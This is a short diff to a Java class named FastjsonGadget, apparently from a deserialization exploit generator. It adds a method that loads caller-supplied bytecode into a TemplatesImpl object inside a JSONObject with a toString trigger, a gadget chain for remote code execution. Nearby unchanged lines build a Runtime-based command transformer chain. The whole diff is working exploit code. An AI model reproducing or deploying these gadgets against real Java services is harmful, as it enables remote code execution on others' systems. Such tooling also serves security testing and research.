@@ -43,6 +43,12 @@ public class FastjsonGadget {
         return makeToStringTrigger(jsonObject);
     }
 
+    public static Object create(byte[] bytes) throws Exception {
+        JSONObject jsonObject = new JSONObject();
+        jsonObject.put("oops", (Serializable) createTemplatesImpl(bytes));
+        return makeToStringTrigger(jsonObject);
+    }
+
     public static Object createForFst(String command) throws Exception {
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
@@ -66,6 +72,19 @@ public class FastjsonGadget {
         TemplatesImpl templates = new TemplatesImpl();
         setFieldValue(templates, "_bytecodes", new byte[][]{
                 makeTransletBytecode(command),
+                classAsBytes(Foo.class)
+        });
+        setFieldValue(templates, "_transletIndex", 0);
+        setFieldValue(templates, "_name", "Pwnr");
+        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+        return templates;
+    }
+
+
+    private static Templates createTemplatesImpl(byte[] bytes) throws Exception {
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates, "_bytecodes", new byte[][]{
+                bytes,
                 classAsBytes(Foo.class)
         });
         setFieldValue(templates, "_transletIndex", 0);
